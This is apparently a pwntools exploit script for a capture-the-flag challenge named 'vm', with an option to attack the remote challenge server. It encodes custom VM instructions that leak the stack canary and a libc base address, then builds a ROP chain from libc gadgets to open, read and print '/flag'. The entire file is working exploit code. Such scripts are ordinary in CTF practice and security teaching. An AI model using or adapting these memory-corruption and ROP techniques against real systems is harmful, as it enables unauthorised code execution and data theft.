from pwn import *
context(arch='amd64', os='linux', log_level='debug')

file_name = './vm'
ld_name   = './ld-linux-x86-64.so.2'
libc_name = './libc.so.6'

elf = ELF(file_name)
libc = ELF(libc_name)

choice = 0
if choice == 1:
    target = 'challenge.imxbt.cn'
    port   = 30238
    p = remote(target, port)
else:
    p = process([ld_name, '--library-path', '.', file_name])

gdb_ = 0
if gdb_ and choice == 0:
    gdb.attach(p)

def rcode(op, reg1, reg2, reg3):
    t = op
    t += reg1 << 8
    t += reg2 << 16
    t += reg3 << 24
    return str(t) + "\n"

def pianyi(p):
    pay = rcode(0, 1,1,4) * (p & 0xf)
    pay += rcode(0, 1,1,5) * ((p >> 4) & 0xf)
    pay += rcode(0, 1,1,6) * ((p >> 8) & 0xf)
    pay += rcode(0, 1,1,7) * ((p >> 12) & 0xf)
    pay += rcode(0, 1,1,8) * ((p >> 16) & 0xf)
    pay += rcode(0, 1,1,9) * ((p >> 20) & 0xf)
    return pay

def pvm(p):
    pay = rcode(6, 1,1,1)
    pay += pianyi(p)
    pay += rcode(0, 0,1,2)
    pay += rcode(7, 0,0,0)
    return pay

pay = rcode(7, 0, 0, 0)*0x201
# canary
pay += rcode(8, 3,0,0)
pay += rcode(7, 0, 0, 0)
pay += rcode(7, 3, 0, 0)
pay += rcode(7, 0, 0, 0)
pay += rcode(8, 2, 0, 0)

#0x1
pay += rcode(3, 4, 3, 3)
# 5 0x10
pay += rcode(0, 5, 4, 4)
pay += rcode(0, 5, 5,5)
pay += rcode(0, 5, 5,5)
pay += rcode(0, 5, 5,5)
#0x100
pay += rcode(2, 6, 5, 5)
#0x1000
pay += rcode(2, 7, 5, 6)
#0x10000
pay += rcode(2, 8, 5, 7)
#0x100000
pay += rcode(2, 9, 5, 8)

#libc基址
pay += pianyi(0x29d90)
pay += rcode(1, 2, 2, 1)

# rop
pay += rcode(7, 0,0,0)
pop_rdi = 0x02a3e5
pop_rsi = 0x02be51
pop_rdx_r12 = 0x11f2e7

pay += pvm(pop_rdx_r12)
pay += rcode(7, 6,0,0)
pay += rcode(7, 0xa,0,0)
pay += pvm(pop_rdi)
pay += rcode(7, 0xa, 0, 0)
pay += pvm(pop_rsi)
pay += pvm(0x21a000)
pay += pvm(libc.sym["read"])

pay += pvm(pop_rdi)
pay += pvm(0x21a000)
pay += pvm(pop_rsi)
pay += rcode(7, 0xa,0,0)
pay += pvm(pop_rdx_r12)
pay += rcode(7, 0xa,4,4)
pay += rcode(7, 0xa,4,4)
pay += pvm(libc.sym["open"])

pay += pvm(pop_rdi)
pay += rcode(0, 0,4,4)
pay += rcode(0, 0,0,4)
pay += rcode(7, 0,0,0)
pay += pvm(pop_rsi)
pay += pvm(0x21a000)
pay += pvm(pop_rdx_r12)
pay += rcode(7, 6,4,4)
pay += rcode(7, 0xa,4,4)
pay += pvm(libc.sym["read"])

pay += pvm(pop_rdi)
pay += rcode(7, 4,0,0)
pay += pvm(pop_rdx_r12)     
pay += rcode(7, 6,4,4)       
pay += rcode(7, 0xa,4,4)
pay += pvm(libc.sym["write"])

pay += rcode(9, 0, 0, 0)
p.send(pay)
p.sendline("/flag\x00")
p.interactive()
